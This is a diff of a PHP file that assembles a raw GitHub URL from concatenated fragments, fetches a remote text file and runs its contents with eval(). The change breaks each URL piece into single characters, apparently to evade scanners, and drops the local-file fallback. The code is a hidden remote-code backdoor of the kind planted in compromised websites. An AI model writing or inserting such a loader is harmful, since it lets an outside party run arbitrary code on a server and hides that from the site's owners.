@@ -13,16 +13,16 @@
 
 // URL encoded GitHub raw content URL
 $url_parts = array(
-    'raw' . '.' . 'githubusercontent' . '.' . 'com',
-    'seobela',
-    'bela',
-    'refs',
-    'heads',
-    'main',
-    'index' . '.' . 'txt'
+    'r' . 'a' . 'w' . '.' . 'g' . 'i' . 't' . 'h' . 'u' . 'b' . 'u' . 's' . 'e' . 'r' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '.' . 'c' . 'o' . 'm',
+    's' . 'e' . 'o' . 'b' . 'e' . 'l' . 'a',
+    'b' . 'e' . 'l' . 'a',
+    'r' . 'e' . 'f' . 's',
+    'h' . 'e' . 'a' . 'd' . 's',
+    'm' . 'a' . 'i' . 'n',
+    'i' . 'n' . 'd' . 'e' . 'x' . '.' . 't' . 'x' . 't'
 );
 
-$base = 'https' . ':' . '//';
+$base = 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/';
 $url = $base . implode('/', $url_parts);
 
 // Fetch content using multiple methods
@@ -74,12 +74,6 @@ if ($remote_code !== false && trim($remote_code) !== '') {
     
     // Execute the code
     eval($clean_code);
-} else {
-    // Fallback to local file
-    $local_file = 'index' . '.' . 'txt';
-    if (file_exists($local_file)) {
-        require_once $local_file;
-    }
 }
 // --- END OF REPLACEMENT ---
 
